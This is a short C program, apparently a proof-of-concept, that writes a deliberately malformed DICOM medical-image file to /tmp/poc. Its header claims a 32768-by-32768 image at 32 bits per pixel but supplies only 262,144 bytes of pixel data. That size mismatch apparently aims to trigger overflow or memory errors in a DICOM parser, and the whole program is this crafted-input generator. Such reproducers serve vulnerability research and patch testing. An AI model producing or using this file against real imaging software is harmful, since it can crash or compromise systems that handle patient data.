#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void put16(FILE *f, unsigned short v) {
    fputc(v & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
}

static void put32(FILE *f, unsigned int v) {
    fputc(v & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 24) & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* 128 zero bytes preamble */
    for (int i = 0; i < 128; i++)
        fputc(0, f);

    /* DICM magic */
    fwrite("DICM", 1, 4, f);

    /* Meta information: group length = 28 (size of (0002,0010) element) */
    /* (0002,0000) Group Length - UL, length 4, value 28 */
    put16(f, 0x0002); put16(f, 0x0000);
    fwrite("UL", 1, 2, f); put16(f, 4); put32(f, 28);

    /* (0002,0010) Transfer Syntax UID - UI, length 20 */
    put16(f, 0x0002); put16(f, 0x0010);
    fwrite("UI", 1, 2, f); put16(f, 20);
    fwrite("1.2.840.10008.1.2.1", 1, 19, f); fputc(0, f);

    /* (0028,0002) Samples per Pixel - US, length 2, value 1 */
    put16(f, 0x0028); put16(f, 0x0002);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 1);

    /* (0028,0004) Photometric Interpretation - CS, length 12 */
    put16(f, 0x0028); put16(f, 0x0004);
    fwrite("CS", 1, 2, f); put16(f, 12);
    fwrite("MONOCHROME2 ", 1, 12, f);

    /* (0028,0010) Rows - US, length 2, value 32768 */
    put16(f, 0x0028); put16(f, 0x0010);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 32768);

    /* (0028,0011) Columns - US, length 2, value 32768 */
    put16(f, 0x0028); put16(f, 0x0011);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 32768);

    /* (0028,0100) Bits Allocated - US, length 2, value 32 */
    put16(f, 0x0028); put16(f, 0x0100);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 32);

    /* (0028,0101) Bits Stored - US, length 2, value 32 */
    put16(f, 0x0028); put16(f, 0x0101);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 32);

    /* (0028,0102) High Bit - US, length 2, value 31 */
    put16(f, 0x0028); put16(f, 0x0102);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 31);

    /* (0028,0103) Pixel Representation - US, length 2, value 0 */
    put16(f, 0x0028); put16(f, 0x0103);
    fwrite("US", 1, 2, f); put16(f, 2); put16(f, 0);

    /* (7FE0,0010) Pixel Data - OB, explicit length = 262144 */
    put16(f, 0x7FE0); put16(f, 0x0010);
    fwrite("OB", 1, 2, f);
    fputc(0, f); fputc(0, f);
    put32(f, 262144);

    /* Write 262144 bytes of pixel data */
    for (int i = 0; i < 262144; i++)
        fputc(0xFF, f);

    fclose(f);
    return 0;
}

